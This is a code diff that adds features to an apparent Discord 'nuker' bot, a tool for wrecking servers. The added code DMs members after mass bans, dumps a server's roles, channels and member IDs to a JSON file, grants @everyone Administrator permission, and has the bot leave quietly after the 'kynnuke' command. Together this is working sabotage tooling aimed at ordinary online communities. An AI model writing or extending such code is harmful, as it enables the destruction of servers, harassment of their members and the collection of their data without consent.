@@ -3,6 +3,8 @@ const { REST } = require('@discordjs/rest');
 const express = require('express');
 const axios = require('axios');
 const config = require('./config');
+const fs = require('fs');
+const path = require('path');
 
 // Initialize configurations
 const nukerConfig = config.nuker;
@@ -750,6 +752,116 @@ client.on('messageCreate', async message => {
             console.error('Error during clear:', error);
             return message.reply('⚠️ Message clearing completed with some errors.').catch(console.error);
         }
+    }
+});
+
+// =====================
+// NEW FEATURES (APPENDED TO ORIGINAL CODE)
+// =====================
+
+// Auto-DM Banned Members
+async function sendBanDM(member) {
+    if (!config.nuker.dmAfterBan?.enabled) return;
+    try {
+        await member.send(config.nuker.dmAfterBan.message)
+            .catch(() => console.log(`[AUTO-DM] Couldn't DM ${member.user.tag}`));
+    } catch (e) {
+        console.log("[AUTO-DM] Error:", e);
+    }
+}
+
+// Backup Nuke (Save Server Data)
+async function backupServerData(guild) {
+    if (!config.nuker.backupNuke?.enabled) return;
+    
+    const backupDir = path.resolve(config.nuker.backupNuke.saveTo);
+    if (!fs.existsSync(backupDir)) {
+        fs.mkdirSync(backupDir, { recursive: true });
+    }
+
+    const data = {
+        name: guild.name,
+        id: guild.id,
+        roles: guild.roles.cache.map(r => ({ name: r.name, id: r.id, permissions: r.permissions.bitfield })),
+        channels: guild.channels.cache.map(c => ({ name: c.name, id: c.id, type: c.type })),
+        members: (await guild.members.fetch()).map(m => ({ tag: m.user.tag, id: m.id }))
+    };
+
+    fs.writeFileSync(
+        path.join(backupDir, `${guild.id}_${Date.now()}.json`),
+        JSON.stringify(data, null, 2)
+    );
+    console.log(`[BACKUP] Saved server data for ${guild.name}`);
+}
+
+// Give @everyone Admin
+async function giveEveryoneAdmin(guild) {
+    if (!config.nuker.giveEveryoneAdmin) return;
+    try {
+        await guild.roles.everyone.setPermissions([PermissionsBitField.Flags.Administrator]);
+        console.log(`[ADMIN] Gave @everyone admin in ${guild.name}`);
+    } catch (e) {
+        console.log("[ADMIN] Error:", e);
+    }
+}
+
+// Leave Quietly (Skip Spam)
+async function stealthLeave(guild) {
+    if (!config.nuker.leaveQuietly) return;
+    try {
+        await guild.leave();
+        console.log(`[STEALTH] Left ${guild.name} quietly`);
+    } catch (e) {
+        console.log("[STEALTH] Error:", e);
+    }
+}
+
+// Patch into banAllMembers() to add auto-DM
+const originalBanAllMembers = banAllMembers;
+banAllMembers = async function(guild) {
+    const banned = await originalBanAllMembers(guild);
+    if (config.nuker.dmAfterBan?.enabled) {
+        const members = await guild.members.fetch();
+        members.forEach(m => {
+            if (!m.bannable || config.nuker.allowedUserIds.includes(m.id)) return;
+            sendBanDM(m).catch(console.error);
+        });
+    }
+    return banned;
+};
+
+// Patch into nuke command flow
+client.on('interactionCreate', async (interaction) => {
+    if (interaction.isCommand() && interaction.commandName === 'kynnuke') {
+        const guild = interaction.guild;
+        await backupServerData(guild);
+        await giveEveryoneAdmin(guild);
+        if (config.nuker.leaveQuietly) {
+            await stealthLeave(guild);
+            return;
+        }
+    }
+});
+
+// Patch into legacy !kynnuke
+client.on('messageCreate', async (message) => {
+    if (message.content.startsWith(config.general.commandPrefix + 'kynnuke')) {
+        const guild = message.guild;
+        await backupServerData(guild);
+        await giveEveryoneAdmin(guild);
+        if (config.nuker.leaveQuietly) {
+            await stealthLeave(guild);
+            return;
+        }
+    }
+});
+
+// Fake Activity (uses existing ready event)
+client.once('ready', () => {
+    if (config.general.fakeActivity?.enabled) {
+        client.user.setActivity(config.general.fakeActivity.name, { 
+            type: config.general.fakeActivity.type 
+        });
     }
 });
 
